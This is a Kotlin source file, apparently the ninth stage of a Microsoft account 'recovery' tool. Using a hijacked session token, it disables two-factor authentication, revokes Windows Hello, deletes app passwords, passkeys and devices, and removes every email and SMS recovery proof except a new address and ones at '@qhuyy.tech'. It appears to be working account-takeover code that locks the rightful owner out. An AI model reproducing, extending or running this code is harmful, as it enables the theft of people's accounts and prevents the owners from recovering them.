package microsoft.recovery.stages

import io.ktor.client.HttpClient
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.ContentType
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive
import microsoft.recovery.context.RecoveryContext
import microsoft.recovery.model.PasskeyRemovalRequest
import microsoft.recovery.model.ProofRemovalRequest
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.StageExecution
import microsoft.recovery.model.StandardProofActionRequest
import microsoft.recovery.util.MicrosoftHttpClientFactory
import org.slf4j.LoggerFactory

class EnhancedStage9Cleanup(
    private val stageDelayMs: Long = 1000L,
    private val maxRetries: Int = 3,
) : RecoveryStageHandler {

    private val logger = LoggerFactory.getLogger(EnhancedStage9Cleanup::class.java)

    override suspend fun execute(
        context: RecoveryContext,
        stageListener: StageListener?,
    ): StageExecution<Unit> = try {
        val client = context.httpClient
        val uaid = context.uaid
        var activeCanary = context.activeCanary

        activeCanary = executeActionWithRetry(
            actionName = "DisableTfa",
            client = client,
            url = "https://account.live.com/API/Proofs/DisableTfa",
            body = StandardProofActionRequest(uaid = uaid),
            initialCanary = activeCanary,
        )
        throttle()

        activeCanary = executeActionWithRetry(
            actionName = "RevokeWindowsHelloProofs",
            client = client,
            url = "https://account.live.com/API/Proofs/RevokeWindowsHelloProofs",
            body = StandardProofActionRequest(uaid = uaid),
            initialCanary = activeCanary,
        )
        throttle()

        activeCanary = executeActionWithRetry(
            actionName = "DeleteAppPassword",
            client = client,
            url = "https://account.live.com/API/Proofs/DeleteAppPassword",
            body = StandardProofActionRequest(uaid = uaid),
            initialCanary = activeCanary,
        )
        throttle()

        val passkeys = context.passKeyIds.filter { it.isNotBlank() }
        for (credentialId in passkeys) {
            activeCanary = executeActionWithRetry(
                actionName = "RemovePasskey($credentialId)",
                client = client,
                url = "https://account.live.com/API/Proofs/RemovePasskey",
                body = PasskeyRemovalRequest(credentialId = credentialId, uaid = uaid),
                initialCanary = activeCanary,
            )
            throttle()
        }

        val targetEmail = context.newEmail.trim()
        val legacyEmailProofs = context.emailProofs.filter {
            !it.name.endsWith("@qhuyy.tech", ignoreCase = true) &&
                !it.name.equals(targetEmail, ignoreCase = true) &&
                it.proofId.isNotBlank()
        }
        for (proof in legacyEmailProofs) {
            val proofId = proof.proofId
            activeCanary = executeActionWithRetry(
                actionName = "DeleteProof(Email:$proofId)",
                client = client,
                url = "https://account.live.com/API/Proofs/DeleteProof",
                body = ProofRemovalRequest(proofId = proofId, uaid = uaid),
                initialCanary = activeCanary,
            )
            throttle()
        }

        val legacySmsProofs = context.smsProofs.filter {
            !it.name.endsWith("@qhuyy.tech", ignoreCase = true) &&
                it.proofId.isNotBlank()
        }
        for (proof in legacySmsProofs) {
            val proofId = proof.proofId
            activeCanary = executeActionWithRetry(
                actionName = "DeleteProof(SMS:$proofId)",
                client = client,
                url = "https://account.live.com/API/Proofs/DeleteProof",
                body = ProofRemovalRequest(proofId = proofId, uaid = uaid),
                initialCanary = activeCanary,
            )
            throttle()
        }

        activeCanary = executeActionWithRetry(
            actionName = "DeleteDevices",
            client = client,
            url = "https://account.live.com/API/Proofs/DeleteDevices",
            body = StandardProofActionRequest(uaid = uaid),
            initialCanary = activeCanary,
        )

        context.activeCanary = activeCanary
        stageListener?.invoke("9", "Cleanup", true, "All authentication proofs revoked and sessions terminated")
        StageExecution.Success(Unit)
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Security cleanup failed: ${e.message}"
        logger.error(msg, e)
        stageListener?.invoke("9", "Cleanup", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SECURITY_CLEANUP, msg, cause = e))
    }

    private suspend inline fun <reified T : Any> executeActionWithRetry(
        actionName: String,
        client: HttpClient,
        url: String,
        body: T,
        initialCanary: String,
    ): String {
        var currentCanary = initialCanary
        var lastException: Exception? = null

        for (attempt in 1..maxRetries) {
            try {
                val response = client.post(url) {
                    contentType(ContentType.Application.Json)
                    header("canary", currentCanary)
                    header("X-Requested-With", "XMLHttpRequest")
                    header("x-ms-apiVersion", "2")
                    header("x-ms-apiTransport", "xhr")
                    setBody(body)
                }

                if (!response.status.isSuccess()) {
                    val status = response.status.value
                    logger.warn("{} attempt {} failed with status {}", actionName, attempt, status)
                    if (attempt == maxRetries) {
                        throw IllegalStateException("$actionName failed with HTTP $status after $maxRetries attempts")
                    }
                    if (stageDelayMs > 0) delay(stageDelayMs * attempt)
                    continue
                }

                val rawText = response.bodyAsText()
                val jsonObject = runCatching {
                    MicrosoftHttpClientFactory.json.parseToJsonElement(rawText) as? JsonObject
                }.getOrNull()

                val errorElement = jsonObject?.get("error")
                if (errorElement != null && errorElement !is JsonNull) {
                    throw IllegalStateException("$actionName failed with API error: $errorElement")
                }

                val updatedCanary = jsonObject?.get("apiCanary")?.let {
                    runCatching { it.jsonPrimitive.content }.getOrNull()
                }?.takeIf { it.isNotBlank() }

                if (updatedCanary != null) {
                    currentCanary = updatedCanary
                }
                return currentCanary
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                lastException = e
                logger.warn("{} attempt {} threw exception: {}", actionName, attempt, e.message)
                if (attempt == maxRetries) {
                    throw lastException
                }
                if (stageDelayMs > 0) delay(stageDelayMs * attempt)
            }
        }
        return currentCanary
    }

    private suspend fun throttle() {
        if (stageDelayMs > 0) delay(stageDelayMs)
    }
}
